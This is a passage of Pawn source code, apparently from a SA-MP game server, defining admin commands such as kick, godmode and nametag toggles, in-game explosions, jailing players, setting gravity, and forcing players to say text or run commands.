	  			if (IsVIP(giveplayerid) && !IsAdmin(giveplayerid)) format(tmps1, sizeof(tmps1), "VIP %s (id: %d) has been kicked from the server.", giveplayername, giveplayerid);
				else if (IsAdmin(giveplayerid)) format(tmps1, sizeof(tmps1), "Admin %s (id: %d) has been kicked from the server.", giveplayername, giveplayerid);
				else format(tmps1, sizeof(tmps1), "%s (id: %d) has been kicked from the server.", giveplayername, giveplayerid);
			} else {
	  			if (IsVIP(giveplayerid) && !IsAdmin(giveplayerid)) format(tmps1, sizeof(tmps1), "VIP %s (id: %d) has been kicked from the server. (Reason: %s)", giveplayername, giveplayerid, params[strlen(tmps2)+1]);
				else if (IsAdmin(giveplayerid)) format(tmps1, sizeof(tmps1), "Admin %s (id: %d) has been kicked from the server. (Reason: %s)", giveplayername, giveplayerid, params[strlen(tmps2)+1]);
				else format(tmps1, sizeof(tmps1), "%s (id: %d) has been kicked from the server. (Reason: %s)", giveplayername, giveplayerid, params[strlen(tmps2)+1]);
			}

			SendServerMessageToAll(EMBED_RED, tmps1);
			format(ircstring, sizeof(ircstring), "by %s", playername);
			SendMessageToAdmins(COLOR_RED, ircstring, 4);
			format(ircstring, sizeof(ircstring), "8,1%s by %s", tmps1, playername);
			IRC_GroupSay(1, IRCOP_CHANNEL, ircstring);
			printflog("ADM-MSG", ircstring);
		} else {
  			if (!strlen(params[strlen(tmps2)+1]))
		    {
  				if (!IsPlayerAdminLevel(playerid, 4))
				return SendErrorMessage(playerid, EMBED_WHITE, "Enter a valid reason.");

	  			if (IsVIP(giveplayerid) && !IsAdmin(giveplayerid)) format(tmps1, sizeof(tmps1), "Admin %s kicked VIP %s (id: %d) from the server.", playername, giveplayername, giveplayerid);
				else if (IsAdmin(giveplayerid)) format(tmps1, sizeof(tmps1), "Admin %s kicked admin %s (id: %d) from the server.", playername, giveplayername, giveplayerid);
				else format(tmps1, sizeof(tmps1), "Admin %s kicked %s (id: %d) from the server.", playername, giveplayername, giveplayerid);
			} else {
	  			if (IsVIP(giveplayerid) && !IsAdmin(giveplayerid)) format(tmps1, sizeof(tmps1), "Admin %s kicked VIP %s (id: %d) from the server. (Reason: %s)", playername, giveplayername, giveplayerid, params[strlen(tmps2)+1]);
				else if (IsAdmin(giveplayerid)) format(tmps1, sizeof(tmps1), "Admin %s kicked admin %s (id: %d) from the server. (Reason: %s)", playername, giveplayername, giveplayerid, params[strlen(tmps2)+1]);
				else format(tmps1, sizeof(tmps1), "Admin %s kicked %s (id: %d) from the server. (Reason: %s).", playername, giveplayername, giveplayerid, params[strlen(tmps2)+1]);
			}

			SendServerMessageToAll(EMBED_RED, tmps1);
			printflog("ADM-MSG", tmps1);
			format(ircstring, sizeof(ircstring), "8,1%s", tmps1);
			IRC_GroupSay(1, IRC_CHANNEL, ircstring);
		}
		KickEx(giveplayerid);
		SendCommandMessageToAdmins(playerid, "kick");
		
		//mysql_run_query(mysqlConnection, "INSERT INTO "MYSQL_TABLE_SERVER_STATISTICS" (server_statistic_date, server_statistic_kicks) VALUES (CURDATE(), 1) ON DUPLICATE KEY UPDATE `server_statistic_id` = LAST_INSERT_ID(server_statistic_id), `server_statistic_kicks` = server_statistic_kicks +1", false, "", "");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_setgod(playerid,params[])
{
	#pragma unused params

	new o;

	GetPlayerName(playerid, playername, sizeof(playername));
	if (servergodmode == true)
	{
		servergodmode = false;
	 	for (o = 0; o < MAX_PLAYERS; o++)
	 	{
	  		if (IsPlayerConnected(o) && !IsPlayerInDMSPJA(o))
		    {
				player[o][godmode] = 0;
				player[o][vgodmode] = 0;
				SetPlayerHealth(o, 100.0);
			}
		}
		format(strings, sizeof(strings), "Admin %s has "EMBED_RED"DISABLED"EMBED_WHITE" server godmode.", playername);
		format(tmps2, sizeof(tmps2), "2Admin %s has DISABLED server godmode.", playername);
	} else {
		servergodmode = true;
	 	for (o = 0; o < MAX_PLAYERS; o++)
	 	{
	  		if (IsPlayerConnected(o) && !IsPlayerInDMSPJA(o))
		    {
				player[o][godmode] = 1;
				//player[o][vgodmode] = 1;
			}
		}
		format(strings, sizeof(strings), "Admin %s has "EMBED_GREEN"ENABLED"EMBED_WHITE" server godmode.", playername);
		format(tmps2, sizeof(tmps2), "2Admin %s has ENABLED server godmode.", playername);
	}
	SendServerMessageToAll(EMBED_WHITE, strings);
	IRC_GroupSay(1, IRC_CHANNEL, tmps2);
	SendCommandMessageToAdmins(playerid, "setgod");
	return 1;
}

dcmd_settags(playerid,params[])
{
	#pragma unused params

	new u, g;

	GetPlayerName(playerid, playername, sizeof(playername));
	if (tags == true)
	{
		tags = false;
		for (u = 0; u < MAX_PLAYERS; u++)
 		{
  			if (IsPlayerConnected(u))
	    	{
	    	 	for (g = 0; g < MAX_PLAYERS; g++)
		 		{
		  			if (IsPlayerConnected(g))
			    	ShowPlayerNameTagForPlayer(u,g,0);
				}
	  		}
		}
		format(strings, sizeof(strings), "Admin %s has "EMBED_RED"DISABLED"EMBED_WHITE" nametags.", playername);
		format(tmps2, sizeof(tmps2), "2Admin %s has DISABLED nametags.", playername);
	} else {
		tags = true;
		for (u = 0; u < MAX_PLAYERS; u++)
 		{
  			if (IsPlayerConnected(u))
	    	{
	    	 	for (g = 0; g < MAX_PLAYERS; g++)
		 		{
		  			if (IsPlayerConnected(g))
			    	ShowPlayerNameTagForPlayer(u,g,1);
				}
	  		}
		}
		format(strings, sizeof(strings), "Admin %s has "EMBED_GREEN"ENABLED"EMBED_WHITE" nametags.", playername);
		format(tmps2, sizeof(tmps2), "2Admin %s has ENABLED nametags.", playername);
	}
	SendServerMessageToAll(EMBED_WHITE, strings);
	IRC_GroupSay(1, IRC_CHANNEL, tmps2);
	SendCommandMessageToAdmins(playerid, "settags");
	return 1;
}

dcmd_setgoto(playerid,params[])
{
	#pragma unused params

	GetPlayerName(playerid, playername, sizeof(playername));
	if (gotos == true)
	{
	    gotos = false;
		format(strings, sizeof(strings), "Admin %s has "EMBED_RED"DISABLED"EMBED_WHITE" teleporting.", playername);
		format(tmps2, sizeof(tmps2), "2Admin %s has DISABLED teleporting.", playername);
	} else {
		gotos = true;
		format(strings, sizeof(strings), "Admin %s has "EMBED_GREEN"ENABLED"EMBED_WHITE" teleporting.", playername);
		format(tmps2, sizeof(tmps2), "2Admin %s has ENABLED teleporting.", playername);
	}
	SendServerMessageToAll(EMBED_WHITE, strings);
	IRC_GroupSay(1, IRC_CHANNEL, tmps2);
	SendCommandMessageToAdmins(playerid, "setgoto");
	return 1;
}

dcmd_setchat(playerid,params[])
{
	#pragma unused params

	GetPlayerName(playerid, playername, sizeof(playername));
	if (colouredchat == true)
	{
	    colouredchat = false;
		format(strings, sizeof(strings), "Admin %s has "EMBED_RED"DISABLED"EMBED_WHITE" coloured chat.", playername);
		format(tmps2, sizeof(tmps2), "2Admin %s has DISABLED coloured chat.", playername);
	} else {
		colouredchat = true;
		format(strings, sizeof(strings), "Admin %s has "EMBED_GREEN"ENABLED"EMBED_WHITE" coloured chat.", playername);
		format(tmps2, sizeof(tmps2), "2Admin %s has ENABLED coloured chat.", playername);
	}
	SendServerMessageToAll(EMBED_WHITE, strings);
	IRC_GroupSay(1, IRC_CHANNEL, tmps2);
	SendCommandMessageToAdmins(playerid, "setchat");
	return 1;
}

dcmd_joincrew(playerid,params[])
{
	new idx,
		crewID;

	strings = strtok(params, idx);
	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /joincrew <crewID> ");
    crewID = strval(strings);

 	if (!crews[crewID])
	return SendErrorMessage(playerid, EMBED_WHITE, "No crew has been created in this slot");

	if (MAX_GROUPS > crewID >= 0)
	{
		player[playerid][moviecrew] = crewID;
		SendCommandMessageToAdmins(playerid, "joincrew");
	} else SendErrorMessage(playerid, EMBED_WHITE, "Crew ID out of range. (0-49)");
	return 1;
}

dcmd_leavecrew(playerid,params[])
{
	#pragma unused params

 	if (player[playerid][moviecrew] == -1)
	return SendErrorMessage(playerid, EMBED_WHITE, "You haven't joined any crew");

	if (crewowner[ player[playerid][moviecrew] ] == playerid)
	return SendErrorMessage(playerid, EMBED_WHITE, "You must use /group drop first because you a crew owner.");

	player[playerid][moviecrew] = -1;
	player[playerid][chat] = 0;
	SendCommandMessageToAdmins(playerid, "leavecrew");
	return 1;
}

dcmd_aeject(playerid,params[])
{
	if (!strlen(params))
	return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /aeject <name|id> ");

	if (!IsNumeric(params)) giveplayerid = ReturnPlayerID(params);
	else giveplayerid = strval(params);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (!IsPlayerSpawned(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

 		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher admin level! Action cancelled.");

		GetPlayerName(playerid, playername, sizeof(playername));
		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));

		if (IsPlayerInAnyVehicle(giveplayerid))
	    {
  			RemovePlayerFromVehicle(giveplayerid);
			format(strings, sizeof(strings), "Admin %s ejected %s (id: %d) from their vehicle",playername, giveplayername, giveplayerid);
		    SendMessageToAdmins(COLOR_LLBLUE, strings, 1);
			format(strings, sizeof(strings), "2Admin %s ejected %s (id: %d) from their vehicle",playername, giveplayername, giveplayerid);
	    	IRC_GroupSay(1, IRC_CHANNEL, strings);
			SendCommandMessageToAdmins(playerid, "aeject");
		} else {
			format(strings, sizeof(strings), "%s (ID: %d) is not inside any vehicle!", giveplayername, giveplayerid);
			SendClientMessage(playerid, COLOR_YELLOW, strings);
		}
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_clearwarnings(playerid,params[])
return dcmd_cw(playerid,params);

dcmd_cw(playerid,params[])
{
	if (!strlen(params))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /cw(clearwarnings) <name|id>");

	if (!IsNumeric(params)) giveplayerid = ReturnPlayerID(params);
	else giveplayerid = strval(params);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		GetPlayerName(playerid, playername, sizeof(playername));
  		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
  		player[giveplayerid][warnings] = 0;
		format(strings, sizeof(strings), "Admin %s has reset %s's (id: %d) warnings.", playername, giveplayername, giveplayerid);
	    SendServerMessageToAdmins(EMBED_WHITE, strings, 1);
		format(strings, sizeof(strings), "[S]: "EMBED_WHITE"Admin %s has reset %s's (id: %d) warnings.", playername, giveplayername, giveplayerid);
	    SendClientMessage(giveplayerid, COLOR_NAVYBLUE, strings);
		SendCommandMessageToAdmins(playerid, "cw(clearwarnings)");
		format(strings, sizeof(strings), "11,1Admin %s has reset %s's (id: %d) warnings.",playername, giveplayername, giveplayerid);
		IRC_GroupSay(1, IRCOP_CHANNEL, strings);
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_strike(playerid,params[])
{
	if (!strlen(params))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /strike <name|id>");

	if (!IsNumeric(params)) giveplayerid = ReturnPlayerID(params);
	else giveplayerid = strval(params);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (!IsPlayerSpawned(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

	   	if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher admin level! Action cancelled.");

  		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
		format(strings, sizeof(strings), "Preparing to strike %s ...",giveplayername);
		SendClientMessage(playerid, COLOR_LIGHTBLUE , strings);
		SetPlayerWeather(giveplayerid, 8);
		SetTimerEx("Lightning",10000,0, "i",giveplayerid);
		SendCommandMessageToAdmins(playerid, "strike");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_akill(playerid,params[])
{
	if (!strlen(params))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /akill <name|id>");

	if (!IsNumeric(params)) giveplayerid = ReturnPlayerID(params);
	else giveplayerid = strval(params);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (!IsPlayerSpawned(giveplayerid))
		SendClientMessage(playerid, COLOR_WHITE, "[INFO]: This player wasn't spawned.");

		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

	    player[giveplayerid][godmode] = 0;
	    SetPlayerArmour(giveplayerid, 0.0);
	    SetPlayerHealth(giveplayerid, 0.0);
   		SendCommandMessageToAdmins(playerid, "akill");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_explode(playerid,params[])
{
	/*new Float:x, Float:y, Float:z;
    GetPlayerPos( playerid, x, y, z );
    z = z-2;
    for (new i=0; i<50; i++)
	{
    	z++;
    	CreateExplosion(x, y, z, 6, 6);
		//printf("%f - %f - %f",x,y,z);
	}*/

	if (!strlen(params))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /explode <name|id>");

	if (!IsNumeric(params)) giveplayerid = ReturnPlayerID(params);
	else giveplayerid = strval(params);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (!IsPlayerSpawned(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

	    player[giveplayerid][godmode] = 0;
	    SetPlayerArmour(giveplayerid, 0.0);
	    SetPlayerHealth(giveplayerid, 100.0);
	    GetPlayerPos(giveplayerid, playerxyza[0], playerxyza[1], playerxyza[2]);
	    CreateExplosion(playerxyza[0], playerxyza[1], playerxyza[2], 10, 2.5);
	    CreateExplosion(playerxyza[0], playerxyza[1], playerxyza[2], 10, 2.5);
	    CreateExplosion(playerxyza[0], playerxyza[1], playerxyza[2], 10, 2.5);
		SendCommandMessageToAdmins(playerid, "explode");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_bigbang(playerid,params[])
{
	/*new Float:x, Float:y, Float:z;
    GetPlayerPos( playerid, x, y, z );
    z = z-2;
    for (new i=0; i<50; i++)
	{
    	z++;
    	CreateExplosion(x, y, z, 6, 6);
		//printf("%f - %f - %f",x,y,z);
	}*/

	if (!strlen(params))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /bigbang <name|id>");

	if (!IsNumeric(params)) giveplayerid = ReturnPlayerID(params);
	else giveplayerid = strval(params);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (!IsPlayerSpawned(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

	    player[giveplayerid][godmode] = 0;
	    SetPlayerArmour(giveplayerid, 0.0);
	    SetPlayerHealth(giveplayerid, 100.0);
	    GetPlayerPos(giveplayerid, playerxyza[0], playerxyza[1], playerxyza[2]);

	    CreateExplosion(playerxyza[0], playerxyza[1], playerxyza[2]-2, 6, 500.0);
	    CreateExplosion(playerxyza[0], playerxyza[1], playerxyza[2]-1, 6, 500.0);

	    CreateExplosion(playerxyza[0]-2, playerxyza[1]-2, playerxyza[2], 6, 500.0);
	    CreateExplosion(playerxyza[0]-1, playerxyza[1]-1, playerxyza[2], 6, 500.0);
	    CreateExplosion(playerxyza[0], playerxyza[1], playerxyza[2], 6, 500.0);
	    CreateExplosion(playerxyza[0]+1, playerxyza[1]+1, playerxyza[2], 6, 500.0);
	    CreateExplosion(playerxyza[0]+2, playerxyza[1]+2, playerxyza[2], 6, 500.0);

	    CreateExplosion(playerxyza[0], playerxyza[1], playerxyza[2]+1, 6, 500.0);
	    CreateExplosion(playerxyza[0], playerxyza[1], playerxyza[2]+2, 6, 500.0);
		SendCommandMessageToAdmins(playerid, "bigbang");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_forcesay(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forcesay <name|id> <message>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (!strlen(params[strlen(tmps2)+1]))
	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forcesay <name|id> <message>");

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (giveplayerid == playerid)
	    return SendErrorMessage(playerid, EMBED_WHITE, "You can't force yourself");

		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

	    //SendPlayerMessageToAll(giveplayerid, params[strlen(tmps2)+1]);
	    CallRemoteFunction("OnPlayerText", "is", giveplayerid, params[strlen(tmps2)+1]);
		SendCommandMessageToAdmins(playerid, "forcesay");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_forceirc(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forceirc <fakename> <message>");

	if (!strlen(params[strlen(tmps2)+1]))
	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forceirc <fakename> <message>");

	format(strings, sizeof(strings), "%s on IRC: %s", tmps2, params[strlen(tmps2)+1]);
    SendClientMessageToAll(COLOR_LIGHTNAVY, strings);
	format(strings, sizeof(strings), "3 %s on 4f7IRC3: %s", tmps2, params[strlen(tmps2)+1]);
   	IRC_GroupSay(1, IRC_CHANNEL, strings);
	SendCommandMessageToAdmins(playerid, "forceirc");
	return 1;
}

dcmd_setg(playerid,params[])
return dcmd_setgravity(playerid, params);

dcmd_setgravity(playerid,params[])
{
    new idx,
		Float:gravity = 0.008;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /setg(ravity) <gravity>");

	gravity = floatstr(tmps2);
	SetGravity(gravity);
 	GetPlayerName(playerid, playername, sizeof(playername));
	format(strings, sizeof(strings), "Admin %s has changed the server gravity to %f.", playername, gravity);
	SendServerMessageToAll(EMBED_WHITE, strings);
	format(strings, sizeof(strings), "2Admin %s has changed the server gravity to %f.", playername, gravity);
  	IRC_GroupSay(1, IRC_CHANNEL, strings);
	SendCommandMessageToAdmins(playerid, "setg(ravity)");
	return 1;
}

dcmd_setdrunk(playerid,params[])
{
 	new idx,
	 	drunklevel;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || !IsNumeric(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setdrunk <drunklevel>");
	drunklevel = strval(tmps2);

	if (drunklevel < 0 || drunklevel > 500)
	{
		SendErrorMessage(playerid, EMBED_WHITE, "Normal: 0-20, Drunk: 20-500");
		SendClientMessage(playerid, COLOR_WHITE, "If below 500 -> /drunk disabled || above 500 -> /drunk enabled.");
		return 1;
	}

	if (drunklevel < 500) drunken = true;
	else drunken = false;

	drunklevel *= 100;
	for (new i = 0; i < MAX_PLAYERS; i++)
	{
		SetPlayerDrunkLevel(i, drunklevel);
	}

	GetPlayerName(playerid, playername, sizeof(playername));
	format(strings, sizeof(strings), "Admin %s has changed the server drunklevel to %d.", playername, drunklevel);
	SendServerMessageToAll(EMBED_WHITE, strings);
	format(strings, sizeof(strings), "2Admin %s has changed the server drunklevel to %d.", playername, drunklevel);
   	IRC_GroupSay(1, IRC_CHANNEL, strings);
	SendCommandMessageToAdmins(playerid, "setdrunk");
	return 1;
}

dcmd_bigbang2(playerid,params[])
{
	if (!strlen(params))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /bigbang2 <name|id>");

	if (!IsNumeric(params)) giveplayerid = ReturnPlayerID(params);
	else giveplayerid = strval(params);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (!IsPlayerSpawned(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

	    player[giveplayerid][godmode] = 0;
	    SetPlayerArmour(giveplayerid, 0.0);
	    SetPlayerHealth(giveplayerid, 100.0);
	    GetPlayerPos(giveplayerid, playerxyza[0], playerxyza[1], playerxyza[2]);

	    CreateExplosion(playerxyza[0], playerxyza[1], playerxyza[2]-4, 6, 500.0);
	    CreateExplosion(playerxyza[0], playerxyza[1], playerxyza[2]-2, 6, 500.0);

	    CreateExplosion(playerxyza[0]-4, playerxyza[1]-4, playerxyza[2], 6, 500.0);
	    CreateExplosion(playerxyza[0]-2, playerxyza[1]-2, playerxyza[2], 6, 500.0);
	    CreateExplosion(playerxyza[0], playerxyza[1], playerxyza[2], 6, 500.0);
	    CreateExplosion(playerxyza[0]+2, playerxyza[1]+2, playerxyza[2], 6, 500.0);
	    CreateExplosion(playerxyza[0]+4, playerxyza[1]+4, playerxyza[2], 6, 500.0);

	    CreateExplosion(playerxyza[0], playerxyza[1], playerxyza[2]+2, 6, 500.0);
	    CreateExplosion(playerxyza[0], playerxyza[1], playerxyza[2]+4, 6, 500.0);
		SendCommandMessageToAdmins(playerid, "bigbang2");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_pwn(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_DARKRED , "[USAGE]: /pwn <playerid>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (giveplayerid == playerid)
		return SendErrorMessage(playerid, EMBED_WHITE, "You can't pwn yourself!");

		if (!IsPlayerSpawned(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

		if (player[giveplayerid][jailed] == 1)
		return SendErrorMessage(playerid, EMBED_WHITE, "That player is already pwned.");

  		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
		return SendClientMessage(playerid, COLOR_WHITE , "This player has higher priveleges than you. Action cancelled.");

		player[giveplayerid][muted] = 1;
		player[giveplayerid][antifall] = 0;
		ResetPlayerWeapons(giveplayerid);
		player[giveplayerid][jailed] = 1;
		SetPlayerInterior(giveplayerid,0);
		SetPlayerPos(giveplayerid, 154.0770, -1951.9774, 47.8750);
		SetPlayerFacingAngle(giveplayerid, 0);

		TogglePlayerControllable(giveplayerid, 0);
		player[giveplayerid][frozen] = 1;

		player[giveplayerid][blocked] = 1;

		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
		GetPlayerName(playerid, playername, sizeof(playername));
		format(strings, sizeof(strings), "Admin %s has muted, jailed and frozen %s (id: %d).", playername, giveplayername, giveplayerid);
		SendServerMessageToAll(EMBED_RED, strings);
		format(strings, sizeof(strings), "4Admin %s has muted, jailed and frozen %s (id: %d).", playername, giveplayername, giveplayerid);
		IRC_GroupSay(1, IRC_CHANNEL, strings);
		SendCommandMessageToAdmins(playerid, "pwn");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_unpwn(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_DARKRED , "[USAGE]: /unpwn <playerid>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (giveplayerid == playerid)
		return SendErrorMessage(playerid, EMBED_WHITE, "You can't pwn yourself!");

		if (!IsPlayerSpawned(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

		if (player[giveplayerid][jailed] == 0)
		return SendErrorMessage(playerid, EMBED_WHITE, "That player is not pwned.");

  		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
		return SendClientMessage(playerid, COLOR_WHITE , "This player has higher priveleges than you. Action cancelled.");

		player[giveplayerid][muted] = 0;

		player[giveplayerid][jailed] = 0;
		SpawnPlayer(giveplayerid);

		TogglePlayerControllable(giveplayerid, 1);
		player[giveplayerid][frozen] = 0;

		player[giveplayerid][blocked] = 0;

		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
		GetPlayerName(playerid, playername, sizeof(playername));
		format(strings, sizeof(strings), "Admin %s has unmuted, unjailed and unfrozen %s (id: %d).", playername, giveplayername, giveplayerid);
		SendServerMessageToAll(EMBED_RED, strings);
		format(strings, sizeof(strings), "4Admin %s has unmuted, unjailed and unfrozen %s (id: %d).", playername, giveplayername, giveplayerid);
		IRC_GroupSay(1, IRC_CHANNEL, strings);
		SendCommandMessageToAdmins(playerid, "unpwn");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_forcecmd(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forcecmd <name|id/all> <command>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (!strlen(params[strlen(tmps2)+1]))
	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forcecmd <name|id/all> <command>");

	if (!strcmp(tmps2, "all", true))
	{
	    if (!IsPlayerAdminLevel(playerid, 5))
	    return SendErrorMessage(playerid, EMBED_WHITE, "This option is inacessible for your level.");

 		if (!strlen(params[strlen(tmps2)+1]))
	    return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forcecmd <name|id/all> <command>");

	    format(strings, sizeof(strings), "/%s",params[strlen(tmps2)+1]);
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
		    if (IsPlayerConnected(i) && !IsPlayerNPC(i))
	    	CallRemoteFunction("OnPlayerCommandText", "is", i, strings);
		}
		SendCommandMessageToAdmins(playerid, "forcecmd", 4);
		return 1;
	}

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
 		if (giveplayerid == playerid)
	    return SendErrorMessage(playerid, EMBED_WHITE, "You can't force yourself");

		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN] || IsPlayerNPC(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

        if (strfind(params[strlen(tmps2)+1], "setpass", true) != -1 || strfind(params[strlen(tmps2)+1], "warn", true) != -1 || strfind(params[strlen(tmps2)+1], "kick", true) != -1 || strfind(params[strlen(tmps2)+1], "ban", true) != -1  || strfind(params[strlen(tmps2)+1], "ostick", true) != -1  || strfind(params[strlen(tmps2)+1], "postick", true) != -1)
        return SendErrorMessage(playerid, EMBED_WHITE, "This command is blocked in forcecmd");

	    format(strings, sizeof(strings), "/%s",params[strlen(tmps2)+1]);
	    CallRemoteFunction("OnPlayerCommandText", "is", giveplayerid, strings);
		SendCommandMessageToAdmins(playerid, "forcecmd", 4);
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_forceanim(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forceanim <name|id/all> <anim cmd from /ahelp>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (!strlen(params[strlen(tmps2)+1]))
	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forceanim <name|id/all> <anim cmd from /ahelp>");

	if (!strcmp(tmps2, "all", true))
	{
 		if (!strlen(params[strlen(tmps2)+1]))
	    return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forceanim <name|id/all> <anim cmd from /ahelp>");

 		format(strings, sizeof(strings), "/%s",params[strlen(tmps2)+1]);
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
		    if (IsPlayerConnected(i) && !IsPlayerNPC(i))
		    CallRemoteFunction("ApplyAnimationForPlayer", "is", i, strings);
		}
		SendCommandMessageToAdmins(playerid, "forceanim", 4);
		return 1;
	}

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
 		if (giveplayerid == playerid)
	    return SendErrorMessage(playerid, EMBED_WHITE, "You can't force yourself");

		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN] || IsPlayerNPC(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

	    format(strings, sizeof(strings), "/%s",params[strlen(tmps2)+1]);
	    CallRemoteFunction("ApplyAnimationForPlayer", "is", giveplayerid, strings);
